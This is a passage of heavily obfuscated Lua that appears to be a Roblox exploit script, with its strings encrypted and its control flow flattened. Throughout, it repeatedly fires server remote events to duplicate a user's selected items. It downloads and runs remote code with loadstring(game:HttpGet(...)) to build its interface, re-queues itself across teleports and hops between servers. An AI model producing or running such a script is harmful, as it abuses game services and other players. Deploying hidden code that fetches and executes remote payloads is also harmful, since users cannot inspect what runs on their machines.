table.insert(v220,{[v7("\253\112\251\9","\42\147\17\150\108\112")]=v661.name,[v7("\30\179\44\113\243\225\27\191","\136\111\198\77\31\135")]=tonumber(v661.quantity) or (1288 -(485 + 802)) });end end v563=560 -(432 + 127) ;end end end if (v218==(1075 -(1065 + 8))) then table.sort(v220,function(v587,v588) local v589=0 + 0 ;while true do if (v589==(1601 -(635 + 966))) then if (v587.quantity==v588.quantity) then return v587.name<v588.name ;end return v587.quantity>v588.quantity ;end end end);v221=math.min(math.max(1,v217), #v220);v218=3 + 0 ;end if (v218==(42 -(5 + 37))) then v219=v70.Items;if ((typeof(v219)~=v7("\57\207\93\231\67","\224\77\174\63\139\38\175")) or ( #v219==(0 -0))) then return v7("\170\78\24\39\144\68\85\61\196\71\87\59\138\69","\78\228\33\56");end v218=1;end if (v218==(2 + 1)) then v222={};for v590=1,v221 do local v591=0;local v592;while true do if ((0 -0)==v591) then v592=v220[v590];table.insert(v222,string.format(v7("\71\13\238\22\248\247\87\177\71\13","\201\98\105\199\54\221\132\119"),v590,v592.name,v592.quantity));break;end end end v218=4;end end end local function v123(v223) local v224=0;local v225;local v226;while true do if (v224==(1 + 1)) then if ((type(v223)==v7("\197\180\31\38\205\209","\163\182\192\109\79")) and (v223~="")) then v226=v223   .. "\n"   .. v226 ;end pcall(function() v91:Set({[v7("\0\47\20\204\240","\149\84\70\96\160")]=v7("\17\8\27\232\54\18\2\255\33\70\62\249\57\18\24\254","\141\88\102\109"),[v7("\144\92\196\100\31\51\65","\161\211\51\170\16\122\93\53")]=v226});end);break;end if (v224==(0 -0)) then if  not v91 then return;end v225=v121();v224=1;end if (v224==(3 -2)) then v226=v7("\112\204\181\236\56\197\83\208\181\225\41\212\91\192\225\224\40\128\71\198\225\171","\160\62\163\149\133\76");if (v225>0) then v226=string.format("Detected %d item entries.\n%s",v225,v122(v85));end v224=3 -1 ;end end end local function v124() local v227=0 -0 ;local v228;local v229;local v230;while true do if (v227==(3 + 0)) then pcall(function() v93:Notify({[v7("\207\167\166\36\254","\72\155\206\210")]=v7("\111\116\66\11\61\82\117\70\23\115\98\127\64\11\48\82\127\80","\83\38\26\52\110"),[v7("\123\24\41\82\93\25\51","\38\56\119\71")]=string.format("Detected %d item entries\n%s",v229,v230),[v7("\215\250\74\215\49\95\252\225","\54\147\143\56\182\69")]=535 -(318 + 211) ,[v7("\255\140\254\78\218","\191\182\225\159\41")]=4478747876 -  -4614582 });end);break;end if (v227==(1589 -(963 + 624))) then v229=v121();v230=v122(v85);v227=2 + 1 ;end if (v227==(847 -(518 + 328))) then if ((v228-v94)<v84) then return;end v94=v228;v227=4 -2 ;end if (v227==0) then if  not v93 then return;end v228=os.clock();v227=1 -0 ;end end end local function v125() local v231,v232=pcall(function() return game:GetService(v7("\25\23\56\89\130\132\195\63\23\44\102\159\136\208\42\21\45","\162\75\114\72\53\235\231")):WaitForChild(v7("\190\57\73\237\71\7\159","\98\236\92\36\130\51")):WaitForChild(v7("\150\28\29\175\64\187\161\25\170\15\9\180\81\167\167\41","\80\196\121\108\218\37\200\213"));end);if ( not v231 or  not v232) then return false;end local v233=false;pcall(function() local v363=0;local v364;while true do if (v363==(317 -(301 + 16))) then v364=0 -0 ;while true do if (v364==(0 -0)) then v232:FireServer();v233=true;break;end end break;end end end);return v233;end local function v126() local v234=0 -0 ;local v235;while true do local v365=0 + 0 ;while true do if (v365==(1 + 0)) then if (v234==1) then if  not v235 then local v685=0 -0 ;while true do if (v685==(1 + 0)) then v26=v235;break;end if (v685==(0 + 0)) then v235=v13:FindFirstChild(v7("\50\118\19\106\78\29\158\41\125\20\122\69\26\133\18\106","\234\96\19\98\31\43\110"));if  not v235 then v235=v13:WaitForChild(v7("\52\26\67\210\169\97\159\47\17\68\194\162\102\132\20\6","\235\102\127\50\167\204\18"),2);end v685=1;end end end if v235 then local v686=0 -0 ;local v687;while true do if ((0 + 0)==v686) then v687=0;while true do if (v687==(1019 -(829 + 190))) then v235:FireServer();return true;end end break;end end end v234=2;end break;end if (v365==0) then if (v234==0) then if v125() then return true;end v235=v26;v234=3 -2 ;end if (v234==(2 -0)) then return false;end v365=1;end end end end local function v127() local v236=0 -0 ;while true do if (v236==0) then v126();for v593=2 -1 ,v86 do if (v121()>(0 + 0)) then break;end task.wait(v87);v126();end break;end end end local function v128(v237) local v238=0 + 0 ;local v239;while true do if (v238==(0 -0)) then local v565=0 + 0 ;while true do if (v565==(613 -(520 + 93))) then v239={};if (type(v237)~=v7("\67\181\231\42\74\41","\78\48\193\149\67\36")) then return v239;end v565=277 -(259 + 17) ;end if (1==v565) then v238=1 + 0 ;break;end end end if ((1 + 0)==v238) then local v566=0;while true do if ((0 -0)==v566) then for v663 in string.gmatch(v237,v7("\11\32\204\37\10","\33\80\126\224\120")) do local v664=0;local v665;while true do if (v664==0) then v665=string.gsub(v663,v7("\210\237\16\142\20\162\229\74\129\79\166\236","\60\140\200\99\164"),v7("\194\165","\194\231\148\100\70"));if (v665~="") then v239[string.lower(v665)]=true;end break;end end end return v239;end end end end end local function v129(v240) local v241=591 -(396 + 195) ;local v242;local v243;local v244;local v245;local v246;while true do if (v241==(8 -5)) then for v594 in string.gmatch(v240,v7("\213\201\238\13\165","\80\142\151\194")) do local v595=0;local v596;while true do if (v595==(1761 -(440 + 1321))) then v596=string.gsub(v594,v7("\61\131\100\6\75\136\58\5\70\213\61\8","\44\99\166\23"),v7("\57\166","\196\28\151\73\86\83"));if (v596~="") then local v696=0;local v697;while true do if (v696==(1829 -(1059 + 770))) then v697=string.lower(v596);if v242[v697] then local v747=0;while true do if (v747==(0 -0)) then v242[v697]=nil;if v244[v697] then local v757=545 -(424 + 121) ;while true do if (v757==(0 + 0)) then v246=true;table.insert(v245,string.format(v7("\182\16\105\54\141\77\22\114","\22\147\99\73\112\226\56\120"),v596));break;end end else table.insert(v245,string.format(v7("\253\102\162\251\130\172\53\228\250\152\182\113\162\252\131\248\124\236\227\136\182\97\237\231\148","\237\216\21\130\149"),v596));end break;end end end break;end end end break;end end end return table.concat(v245,"\n"),v246;end if (v241==2) then for v597,v598 in ipairs(v243) do if ((typeof(v598)==v7("\206\234\117\228\142","\167\186\139\23\136\235")) and (type(v598.name)==v7("\9\161\154\4\20\178","\109\122\213\232"))) then v244[string.lower(v598.name)]=true;end end v245={};v246=false;v241=3;end if (v241==(1347 -(641 + 706))) then if  not v96 then return v7("\86\64\196\162\229\205\6\95\194\162\248\136\95\67\212\177\182\193\72\90\196\173\226\199\84\85\129\165\255\218\85\88","\168\38\44\161\195\150"),false;end v242=v128(v240);if (next(v242)==nil) then return v7("\144\240\135\119\35\237\246\5\131\253\140\54\41\231\163\4\192\245\140\96\53\230\162\25\146\229\194\112\57\250\165\2","\118\224\156\226\22\80\136\214"),false;end v241=1 + 0 ;end if (v241==(441 -(249 + 191))) then v243=v70.Items;if ((typeof(v243)~=v7("\86\239\91\140\71","\224\34\142\57")) or ( #v243==(0 -0))) then return v7("\206\171\192\220\96\244\29\29\221\166\203\157\106\254\72\28\158\174\203\203\118\255\73\1\204\190\133\219\122\227\78\26","\110\190\199\165\189\19\145\61"),false;end v244={};v241=1 + 1 ;end end end local function v130() local v247=0;local v248;while true do if (v247==(0 -0)) then if  not v92 then return;end v248=select(1,v129(v97));v247=428 -(183 + 244) ;end if (v247==1) then pcall(function() v92:Set({[v7("\182\71\75\83\181","\62\226\46\63\63\208\169")]=v7("\214\28\89\134\28\25\42\90\165\48\65\134\18\77\28\74\228\13\64\144","\62\133\121\53\227\127\109\79"),[v7("\51\27\60\225\211\160\182","\194\112\116\82\149\182\206")]=v248});end);break;end end end local function v131(v249) local v250=0 + 0 ;local v251;local v252;local v253;local v254;local v255;local v256;local v257;local v258;local v259;local v260;local v261;while true do if (v250==(731 -(434 + 296))) then v120(v7("\18\64\224\17\113\194\63\71\244\80\96\193\59\76\179\23\114\195\51\9\245\21\114\218\35\91\246\3\51\218\57\9\242\6\124\199\50\9\247\5\99\203\118\64\253\4\118\220\36\92\227\4\122\193\56","\174\86\41\147\112\19"),0 -0 ,v98,nil,0);task.wait(v89);task.wait(0.15);if v104 then v118(false);v110(false);return;end v120(v7("\122\20\153\14\40\31\5\162\85\7\205\31\42\79\21\190\75\5\205\24\32\3\20\168\79\5\137\75\44\27\20\166\72","\203\59\96\237\107\69\111\113"),0,v98,nil,0);v251=v128(v249);v250=2;end if (v250==(514 -(169 + 343))) then v252=next(v251)~=nil ;if  not v252 then local v627=0 + 0 ;while true do if (v627==(1 -0)) then task.wait(0.8 -0 );v112(false);v627=2;end if (v627==0) then v130();v120(v7("\20\26\169\224\34\245\151\33\24\184\228\35\176\222\48\19\161\161\63\241\218\33\5\236\231\56\226\196\48","\183\68\118\204\129\81\144"),0,v98,nil,0);v627=1 + 0 ;end if (v627==(8 -5)) then local v688=1123 -(651 + 472) ;while true do if (v688==(0 + 0)) then if v93 then pcall(function() v93:Notify({[v7("\58\164\100\232\14","\226\110\205\16\132\107")]=v7("\216\194\233\213\78\249\131\208\208\68\232\198\160\253\84\251\198","\33\139\163\128\185"),[v7("\116\87\10\202\82\86\16","\190\55\56\100")]=v7("\115\161\40\27\1\163\250\66\170\49\94\29\226\254\83\188\124\13\22\243\242\68\174\40\27\23\163\241\79\239\63\17\30\238\242\69\239\58\23\1\240\231","\147\54\207\92\126\115\131"),[v7("\41\36\39\124\25\119\2\63","\30\109\81\85\29\109")]=2 + 2 ,[v7("\214\124\85\177\51","\156\159\17\52\214\86\190")]=4483362458 -0 });end);end return;end end end if (v627==2) then v118(false);v110(false);v627=486 -(397 + 86) ;end end end v253=v70.Items;if ((typeof(v253)~=v7("\186\238\191\176\171","\220\206\143\221")) or ( #v253==(876 -(423 + 453)))) then local v628=0;while true do local v651=0 + 0 ;while true do if (v651==0) then if (v628==(0 + 0)) then v130();v120(v7("\150\113\40\22\203\201\146\149\126\44\25\152\213\221\147\111\109\30\214\218\215\136\105\34\5\193\140\212\143\111\62\3","\178\230\29\77\119\184\172"),0 + 0 ,v98,nil,0 + 0 );v628=1 + 0 ;end if (v628==(1193 -(50 + 1140))) then local v722=0;while true do if (v722==(0 + 0)) then local v748=0;while true do if (v748==0) then if v93 then pcall(function() v93:Notify({[v7("\193\183\30\23\114","\152\149\222\106\123\23")]=v7("\238\39\255\79\186\207\102\198\74\176\222\35\182\103\160\205\35","\213\189\70\150\35"),[v7("\108\90\122\28\74\91\96","\104\47\53\20")]=v7("\179\64\132\29\175\10\227\95\130\29\178\79\186\67\148\14\252\6\173\90\132\18\168\0\177\85\193\26\181\29\176\88","\111\195\44\225\124\220"),[v7("\252\83\18\114\191\162\215\72","\203\184\38\96\19\203")]=3 + 1 ,[v7("\16\126\120\70\203","\174\89\19\25\33")]=4286228481 -  -197133977 });end);end return;end end end end end v651=1115 -(310 + 804) ;end if (1==v651) then if (v628==1) then task.wait(0.8);v112(false);v628=598 -(157 + 439) ;end if (v628==(2 -0)) then v118(false);v110(false);v628=9 -6 ;end break;end end end end v254=0 -0 ;v255=918 -(782 + 136) ;v250=858 -(112 + 743) ;end if (v250==(1174 -(1026 + 145))) then v256=0 + 0 ;v257=718 -(493 + 225) ;v258={};for v599,v600 in ipairs(v253) do if ((typeof(v600)==v7("\59\19\80\66\242","\107\79\114\50\46\151\231")) and (type(v600.name)==v7("\42\178\167\32\132\62","\160\89\198\213\73\234\89\215"))) then local v652=string.lower(v600.name);if v251[v652] then v255=v255 + (3 -2) ;table.insert(v258,{[v7("\70\112\185\251","\165\40\17\212\158")]=v600.name,[v7("\228\212\7\38\40\241","\70\133\185\104\83")]=tonumber(v600.quantity) or (1 + 0) });end end end v259=math.max(2 -1 ,math.floor(v98));v116(v258,v256);v250=1 + 3 ;end if (v250==(0 -0)) then v118(false);v104=false;v110(true);v112(true);v120(v7("\10\188\77\10\212\235\0\62\232\104\13\208\231\78\9\186\67\27\197\241\29","\110\89\200\44\120\160\130"),0 + 0 ,v98,nil,0 -0 );if v93 then pcall(function() v93:Notify({[v7("\159\202\95\74\70","\45\203\163\43\38\35\42\91")]=v7("\225\132\213\47\136\187\20\226\140\217\32\130\233\112\199\149\217","\52\178\229\188\67\231\201"),[v7("\2\78\94\16\242\82\55","\67\65\33\48\100\151\60")]=string.format("Dupe Started\nRepeat Target: %d",math.max(1,math.floor(v98))),[v7("\251\242\188\217\231\214\232\160","\147\191\135\206\184")]=1599 -(210 + 1385) ,[v7("\173\37\167\198\221","\210\228\72\198\161\184\51")]=4483364147 -(1201 + 488) });end);end v250=1 + 0 ;end if (v250==(6 -2)) then while (v257<v259) and ( #v258>(0 -0))  do if v104 then break;end for v629,v630 in ipairs(v258) do if v104 then break;end v22:FireServer(v7("\45\81\65\39\218","\169\100\37\36\74"),v630.name,v630.amount);v254=v254 + (586 -(352 + 233)) ;end v257=v257 + (2 -1) ;v256=v256 + 1 + 0 ;v116(v258,v256);v120(v7("\33\147\182\85\13\151\182\89\14\128\226\68\15\199\166\69\16\130\226\67\5\139\167\83\20\130\166\16\9\147\167\93\19","\48\96\231\194"),v257,v259,v258,v256);if v93 then for v666,v667 in ipairs(v258) do pcall(function() v93:Notify({[v7("\252\83\26\33\28","\227\168\58\110\77\121\184\207")]=v7("\72\61\182\76\190\201\49\149\114\57\188\69\241\255\100\181\126","\197\27\92\223\32\209\187\17"),[v7("\32\80\205\239\6\81\215","\155\99\63\163")]=string.format("Processing %d/%d\nSelected %s count: %s",v257,v259,v667.name,v113(v667.amount,v256)),[v7("\166\196\179\140\173\141\141\223","\228\226\177\193\237\217")]=3,[v7("\29\189\34\225\49","\134\84\208\67")]=4483362458});end);end end if (v257<v259) then task.wait(v88);end end if v104 then local v631=0 -0 ;local v632;while true do if (v631==0) then v632=0;while true do if (v632==(574 -(489 + 85))) then v118(false);v110(false);v632=1;end if (v632==(1502 -(277 + 1224))) then return;end end break;end end end v130();v260,v261=v129(v249);if v93 then pcall(function() v93:Notify({[v7("\39\165\146\80\22","\60\115\204\230")]=v7("\212\59\226\124\232\40\171\64\238\63\232\117\167\30\254\96\226","\16\135\90\139"),[v7("\119\123\8\39\75\90\108","\24\52\20\102\83\46\52")]=string.format("%s\nRepeat Count: %d\nAttempts: %d",v260,v98,v254),[v7("\224\58\51\37\27\205\32\47","\111\164\79\65\68")]=1498 -(663 + 830) ,[v7("\239\212\130\217\43","\138\166\185\227\190\78")]=4483364015 -(1484 + 73) });end);end v120(v7("\239\97\213\50\18\51\11\196\119\192\36\65\99\31\194\122\204\36\90\38\29","\121\171\20\165\87\50\67"),math.min(v257,v259),v259,v258,v256);v250=5;end if (v250==(668 -(119 + 544))) then v118(true,v258,v256);task.wait(0.9 + 0 );v112(false);v110(false);break;end end end local function v132() local v262=0;while true do if (v262==0) then for v601,v602 in ipairs(v81) do local v603=0 + 0 ;local v604;local v605;while true do if (v603==(0 + 0)) then v604,v605=pcall(function() return loadstring(game:HttpGet(v602))();end);if (v604 and v605) then return v605;end break;end end end return nil;end end end local function v133() if v90 then return true;end for v366=1 + 0 ,v82 do local v367=v132();if v367 then local v569=0 + 0 ;local v570;local v571;while true do if (v569==0) then v93=v367;v570,v571=pcall(function() return v367:CreateWindow({[v7("\232\57\180\51","\98\166\88\217\86\217")]=v7("\197\247\112\13\137\206\182\198\112\4\133\217\182\210\108\17\131","\188\150\150\25\97\230"),[v7("\243\138\80\12","\141\186\233\63\98\108")]=250 -(172 + 78) ,[v7("\221\229\45\178\44\255\237\24\191\49\253\239","\69\145\138\76\214")]=v7("\67\206\128\133\176\4\48\255\128\140\188\19\48\235\156\153\186","\118\16\175\233\233\223"),[v7("\167\139\52\191\231\133\122\184\145\55\175\231\159\113\142","\29\235\228\85\219\142\235")]=v7("\20\218\179\201\126\79\43\91\39\221\180\218","\50\93\180\218\189\23\46\71"),[v7("\237\172\84\91\112\217\80\202","\40\190\196\59\44\36\188")]=v7("\15\68\213\184\245\111\77\12\76\217\183\255\61\41\41\85\217","\109\92\37\188\212\154\29"),[v7("\48\231\161\206\52","\58\100\143\196\163\81")]=v7("\62\71\37\162\42\69\241","\110\122\34\67\195\95\41\133"),[v7("\65\190\92\77\218\112\132\114\97\211\108\179\82\68\210","\182\21\209\59\42")]="K",[v7("\147\94\214\28\35\178\178\101\196\4\39\183\178\91\193\45\51\177\186\71\209\14","\222\215\55\165\125\65")]=true,[v7("\8\216\213\27\240\205\232\104\57\216\202\30\197\192\255\68\37\223\193\9","\42\76\177\166\122\146\161\141")]=true,[v7("\134\133\11\200\112\113\176\152\4\218\112\121\171\185\4\216\112\120\162","\22\197\234\101\174\25")]={[v7("\8\58\164\222\122\170\211","\230\77\84\197\188\22\207\183")]=false,[v7("\223\27\202\248\137\179\222\52\244\17","\85\153\116\166\156\236\193\144")]=nil,[v7("\130\233\65\182\202\1\169\229","\96\196\128\45\211\132")]=v7("\6\140\114\83\221\189\132\209\48\142\126\123\199\191\177","\184\85\237\27\63\178\207\212")},[v7("\44\80\26\92\7\75\13","\63\104\57\105")]={[v7("\46\137\165\70\7\130\160","\36\107\231\196")]=false,[v7("\116\187\180\142\73\176","\231\61\213\194")]="",[v7("\59\168\48\118\4\175\56\97\35\162\52\125\26","\19\105\205\93")]=false},[v7("\130\13\199\178\38\186\28\219\140","\95\201\104\190\225")]=false});end);v569=1;end if (v569==1) then if (v570 and v571) then pcall(function() local v698=0 -0 ;local v699;while true do if (3==v698) then v699:CreateParagraph({[v7("\141\199\196\51\74","\47\217\174\176\95")]=v7("\150\210\98\7","\70\216\189\22\98\210\52\24"),[v7("\249\208\173\147\214\212\203","\179\186\191\195\231")]=v7("\216\49\1\164\233\48\11\237\237\54\14\225\185\49\13\233\251\58\10\164\240\44\88\229\245\51\23\243\252\59\86\164\205\55\29\164\241\54\31\236\252\45\88\240\241\58\88\242\248\51\13\225\181\127\12\236\252\127\20\235\247\56\29\246\185\54\12\164\238\54\20\232\185\43\25\239\252\113","\132\153\95\120")});v699:CreateButton({[v7("\159\179\3\40","\192\209\210\110\77\151\186")]=v7("\196\22\50\236\191\247\229\15\39\234\235\193\228\67\11\253\250\201\243","\164\128\99\66\137\159"),[v7("\35\136\229\178\2\136\234\181","\222\96\233\137")]=function() v131(v97);end});break;end if (v698==(1 + 1)) then v92=v699:CreateParagraph({[v7("\184\209\2\213\189","\48\236\184\118\185\216")]=v7("\214\184\91\53\204\32\224\185\23\25\219\49\232\253\100\36\206\32\240\174","\84\133\221\55\80\175"),[v7("\158\232\42\178\194\82\169","\60\221\135\68\198\167")]=v7("\195\188\243\134\2\202\251\175\253\195\86\214\174\174\251\130\76\153\231\179\238\134\76\205\225\175\225\195\68\208\252\174\236\205\2\237\230\184\246\195\86\192\254\184\184\138\86\220\227\253\246\130\79\220\253\253\235\134\82\216\252\188\236\134\70\153\236\164\184\128\77\212\227\188\235\195\86\214\174\190\240\134\65\210\174\180\254\195\86\209\235\164\184\130\80\220\174\185\253\151\71\218\250\184\252\205","\185\142\221\152\227\34")});v699:CreateInput({[v7("\118\196\90\255","\151\56\165\55\154\35\83")]=v7("\132\86\21\235\224\113\0\254\165\66\17\174\131\76\16\224\180","\142\192\35\101"),[v7("\245\96\59\177\226\130\184\32\215\121\60\166","\118\182\21\73\195\135\236\204")]=tostring(v98),[v7("\56\48\27\67\1\5\242\4\56\31\82\48\8\229\28","\157\104\92\122\32\100\109")]=v7("\134\168\219\207\47\103\140\165\186\230\223\197\46\46\153\162\181\163\143\196\40\42\143\174\177","\203\195\198\175\170\93\71\237"),[v7("\28\78\51\218\71\20\200\43\83\42\244\87\5\249\60\109\49\214\68\2\208\33\88\42","\156\78\43\94\181\49\113")]=false,[v7("\84\228\197\164","\25\18\136\164\195\107\35")]=v7("\199\29\150\107\103\172\196\138\237\61\172\78\102\159\206\173\230\57","\216\136\77\201\47\18\220\161"),[v7("\14\237\39\214\10\221\129\38","\226\77\140\75\186\104\188")]=function(v733) local v734=tonumber(v733);if v734 then v98=math.max(1 -0 ,math.floor(v734));end end});v698=1 + 2 ;end if (v698==(0 + 0)) then v699=v571:CreateTab(v7("\128\251","\174\207\171\161"),4483362458);v91=v699:CreateParagraph({[v7("\217\247\25\255\253","\183\141\158\109\147\152")]=v7("\5\7\240\9\34\29\233\30\53\73\213\24\45\29\243\31","\108\76\105\134"),[v7("\200\202\191\245\203\229\209","\174\139\165\209\129")]=v7("\148\178\235\213\207\13\119\56\165\188\240\129\213\0\113\118\237\253\172","\24\195\211\130\161\166\99\16")});v698=1;end if (v698==(1 -0)) then v699:CreateButton({[v7("\104\2\228\41","\118\38\99\137\76\51")]=v7("\206\37\4\28\73\9\243\48\0\28\29\47\239\63","\64\157\70\101\114\105"),[v7("\99\169\171\239\18\65\171\172","\112\32\200\199\131")]=function() local v735=0;while true do if (v735==(1 -0)) then task.spawn(v127);v123(v7("\31\83\93\182\205\162\44\43\16\85\182\213\174\44\56\95\78\161\141\229\108","\66\76\48\60\216\163\203"));v735=2;end if (v735==(0 + 0)) then v96=true;v95=true;v735=1 + 0 ;end if (v735==2) then pcall(function() v367:Notify({[v7("\142\143\109\255\90","\68\218\230\25\147\63\174")]=v7("\158\43\90\64\185\191\106\99\69\179\174\47\19\104\163\189\47","\214\205\74\51\44"),[v7("\217\67\236\232\114\244\88","\23\154\44\130\156")]=v7("\56\168\187\171\56\7\30\180\180\238\37\16\16\168\237\188\51\2\4\163\190\186\51\23","\115\113\198\205\206\86"),[v7("\160\66\236\91\144\94\241\84","\58\228\55\158")]=2 + 2 ,[v7("\157\132\209\41\57","\85\212\233\176\78\92\205")]=6614877065 -2131514607 });end);break;end end end});v699:CreateInput({[v7("\100\89\133\231","\130\42\56\232")]=v7("\217\176\40\230\67\43\239\177\100\202\84\58\231\166","\95\138\213\68\131\32"),[v7("\9\61\179\81\115\36\60\151\66\122\63\45","\22\74\72\193\35")]="",[v7("\28\117\229\91\41\113\235\84\40\124\246\108\41\97\240","\56\76\25\132")]=v7("\119\213\174\43\143\112\192\166\35\131\30\232\191\35\194\30\239\170\43\202","\175\62\161\203\70"),[v7("\14\216\206\28\35\57\233\198\11\33\29\219\215\22\39\26\210\192\6\38\16\210\208\7","\85\92\189\163\115")]=false,[v7("\15\160\49\63","\88\73\204\80")]=v7("\1\179\47\117\44\214\43\128\4\67\45\243\58\134\29\85\0\212\62\150\4","\186\78\227\112\38\73"),[v7("\223\86\241\89\81\123\255\92","\26\156\55\157\53\51")]=function(v736) local v737=0 -0 ;local v738;while true do if (v737==(0 + 0)) then v738=0;while true do if (v738==(0 + 0)) then v97=v736 or "" ;v130();break;end end break;end end end});v698=449 -(133 + 314) ;end end end);pcall(function() v367:Notify({[v7("\141\186\179\19\141","\144\217\211\199\127\232\147")]=v7("\203\46\55\36\218\87\66\116\241\42\61\45\149\97\23\84\253","\36\152\79\94\72\181\37\98"),[v7("\244\215\73\43\210\214\83","\95\183\184\39")]=v7("\128\22\167\42\91\129\6\176\59\167\53\65\131\1\176\44\244\32\65\140\14\172","\98\213\95\135\70\52\224"),[v7("\218\182\219\118\64\247\172\199","\52\158\195\169\23")]=5,[v7("\83\177\51\115\131","\235\26\220\82\20\230\85\27")]=4483362458 -0 });end);v90=true;return true;end break;end end end if (v366<v82) then task.wait(v83);end end warn(v7("\187\160\224\206\123\154\225\217\203\113\139\164\169\230\97\152\164\179\130\114\137\168\229\199\112\200\181\230\130\120\135\160\237\130\70\137\184\239\203\113\132\165\169\247\93\200\160\239\214\113\154\225\251\199\96\154\168\236\209","\20\232\193\137\162"));return false;end local function v134() local v263=0;local v264;local v265;while true do if (v263==(3 -2)) then v265={v7("\49\155\17\16\209\125\90\20\156\21\7\192\122\118","\63\101\233\112\116\180\47"),v7("\247\41\236\22\241\56\196\14\196","\86\163\91\141\114\152"),v7("\122\5\64\97\59\87\2\122\116\15\122","\90\51\107\20\19"),v7("\163\255\145\230\59\132\243\132\251\52\130\254\176\198","\93\237\144\229\143")};for v606,v607 in ipairs(v265) do local v608=1549 -(647 + 902) ;local v609;while true do if (v608==(0 -0)) then v609=v264:FindFirstChild(v607);if (v609 and v609:IsA(v7("\38\245\226\28\14\72\50\227\249","\38\117\150\144\121\107"))) then v609.Enabled=false;end break;end end end break;end if (v263==(233 -(85 + 148))) then if ( not v46 or  not v77) then return;end v264=v77:FindFirstChild(v7("\18\211\196\191\226\158\48\100\43","\17\66\191\165\198\135\236\119")) or v77:WaitForChild(v7("\63\163\175\10\250\250\203\196\6","\177\111\207\206\115\159\136\140")) ;v263=1290 -(426 + 863) ;end end end local function v135(v266) local v267=0;local v268;while true do if (v267==1) then warn(v7("\75\139\199\79\160\64\125\97\113\143\205\70\239\118\40\65\125\208\142","\49\24\234\174\35\207\50\93")   .. v268 );break;end if (v267==(0 -0)) then v268=string.format("%s\nSwitching to public server in %d seconds",v60,math.max(1654 -(873 + 781) ,math.floor(v266 or (0 -0) )));pcall(function() v11:SetCore(v7("\30\190\224\62\3\180\250\51\43\178\237\59\57\178\225\52","\90\77\219\142"),{[v7("\210\13\53\53\73","\26\134\100\65\89\44\103")]=v59,[v7("\197\230\40\55","\196\145\131\80\67")]=v268,[v7("\58\165\20\9\12\225\17\190","\136\126\208\102\104\120")]=2.1 -1 });end);v267=1 + 0 ;end end end local function v136() return queue_on_teleport or (syn and syn.queue_on_teleport) ;end local function v137() local v269=0 -0 ;local v270;local v271;while true do if (v269==(3 -0)) then pcall(function() v270(v271);end);break;end if (v269==(2 -1)) then if  not v270 then return;end v271="";v269=2;end if ((1949 -(414 + 1533))==v269) then if ((type(v69)==v7("\31\230\239\129\127\11","\17\108\146\157\232")) and (v69~="")) then v271=v69;elseif ((type(v68)==v7("\88\215\6\228\33\175","\200\43\163\116\141\79")) and (v68~="")) then v271=string.format(v7("\179\57\60\135\163\224\241\182\56\58\203\183\245\238\186\108\21\151\164\228\196\186\34\117\198\161\189\170\247\127","\131\223\86\93\227\208\148"),v68);end if (v271=="") then return;end v269=3;end if (v269==(0 + 0)) then if  not v67 then return;end v270=v136();v269=556 -(443 + 112) ;end end end local function v138() local v272=game.PlaceId;local v273=nil;for v368=1480 -(888 + 591) ,v64 do local v369=string.format(v7("\235\81\162\166\14\239\172\10\177\183\16\176\240\11\164\185\31\185\236\93\248\181\18\184\172\83\231\249\26\180\238\64\165\249\88\177\172\86\179\164\11\176\241\86\249\134\8\183\239\76\181\233\14\186\241\81\153\164\25\176\241\24\151\165\30\243\239\76\187\191\9\232\166\65\240\179\5\182\239\80\178\179\59\160\239\73\145\183\16\176\240\24\162\164\8\176","\213\131\37\214\214\125"),v272,v65);if v273 then v369=v369   .. v7("\96\40\48\173\242\41\57\120","\129\70\75\69\223")   .. v10:UrlEncode(v273) ;end local v370,v371=pcall(function() return game:HttpGet(v369);end);if ( not v370 or (type(v371)~=v7("\85\223\225\224\114\232","\143\38\171\147\137\28"))) then break;end local v372,v373=pcall(function() return v10:JSONDecode(v371);end);if ( not v372 or (typeof(v373)~=v7("\196\131\187\255\6","\180\176\226\217\147\99\131"))) then break;end local v374=v373.data;if (typeof(v374)==v7("\199\184\45\11\214","\103\179\217\79")) then local v572=0 -0 ;local v573;while true do if (v572==0) then v573={};for v668,v669 in ipairs(v374) do if (typeof(v669)==v7("\94\182\30\217\68","\195\42\215\124\181\33\236")) then local v701=tostring(v669.id or "" );local v702=tonumber(v669.playing) or (0 + 0) ;local v703=tonumber(v669.maxPlayers) or (0 -0) ;local v704=(v703<=0) or (v702<v703) ;if ((v701~="") and (v701~=game.JobId) and v704 and (v702>=v63)) then table.insert(v573,{[v7("\7\86\53\23\33","\152\109\57\87\94\69")]=v701,[v7("\233\219\11\186\183\220\83","\200\153\183\106\195\222\178\52")]=v702});end end end v572=1;end if (v572==1) then if ( #v573>(0 + 0)) then local v689=0 + 0 ;while true do if (v689==(0 + 0)) then local v723=0;while true do if (v723==0) then table.sort(v573,function(v750,v751) return v750.playing<v751.playing ;end);return v573[1 -0 ].jobId;end end end end end break;end end end v273=v373.nextPageCursor;if ( not v273 or (v273=="")) then break;end end return nil;end local function v139() local v274=0;local v275;while true do if (v274==0) then v275=0 -0 ;while true do if (v275==(1679 -(136 + 1542))) then task.spawn(function() local v670=0 -0 ;while true do if (v670==(0 + 0)) then while v79 do local v724=math.max(1 -0 ,math.floor(v61));for v728=v724,1, -1 do local v729=0 + 0 ;local v730;while true do if (v729==0) then v730=486 -(68 + 418) ;while true do if (v730==1) then task.wait(2 -1 );break;end if (v730==0) then if  not v79 then local v758=0 -0 ;while true do if ((0 + 0)==v758) then local v760=1092 -(770 + 322) ;while true do if ((0 + 0)==v760) then v80=false;return;end end end end end v135(v728);v730=1 + 0 ;end end break;end end end if (v62 and v79) then local v739=v138();if v739 then local v752=0 + 0 ;local v753;while true do if (v752==0) then v753=0 -0 ;while true do if (v753==(0 -0)) then v137();pcall(function() v12:TeleportToPlaceInstance(game.PlaceId,v739,v77);end);break;end end break;end end else local v754=0;while true do if (v754==0) then v137();pcall(function() v12:Teleport(game.PlaceId,v77);end);break;end end end end task.wait(math.max(0.5 -0 ,v66));end v80=false;break;end end end);break;end if (v275==(0 -0)) then if v80 then return;end v80=true;v275=1 + 0 ;end end break;end end end if v57 then local v376=0 -0 ;local v377;while true do if (v376==(0 + 0)) then v377=v78();v79=v377;break;end end end if v79 then v139();else local v378=0 + 0 ;while true do if (v378==(0 + 0)) then v134();task.spawn(v133);break;end end end local function v140() if ( #v48==(0 -0)) then return nil;end v49=(v49% #v48) + (1 -0) ;return v48[v49];end local function v141(v276) local v277=0;local v278;while true do local v379=0;while true do if (v379==(0 + 0)) then if (v277==(0 -0)) then if v79 then return false;end v278=tonumber(v276) or v140() ;v277=1;end if (v277==(3 -2)) then if ( not v278 or (v278<=(0 + 0))) then return false;end return pcall(function() 